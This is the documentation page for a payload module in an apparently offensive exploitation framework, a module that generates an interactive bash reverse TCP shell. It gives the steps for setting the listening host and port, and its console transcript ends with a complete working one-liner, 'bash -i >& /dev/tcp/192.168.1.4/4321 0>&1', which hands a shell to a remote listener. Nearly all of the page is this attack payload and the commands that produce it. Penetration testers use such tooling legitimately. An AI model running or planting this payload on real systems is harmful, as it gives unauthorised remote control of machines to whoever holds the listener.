## Description

Module generates payload that creates interactive tcp reverse shell by using bash one-liner. 

## Verification Steps

  1. Start `./exf.py`
  2. Do: `use payloads/cmd/bash_reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates bash tcp reverse shell payload

## Scenarios

```
exf > use payloads/cmd/bash_reverse_tcp
exf (Bash Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
exf (Bash Reverse TCP) > set lport 4321
[+] lport => 4321
exf (Bash Reverse TCP) > run
[*] Running module...
[*] Generating payload
bash -i >& /dev/tcp/192.168.1.4/4321 0>&1
```
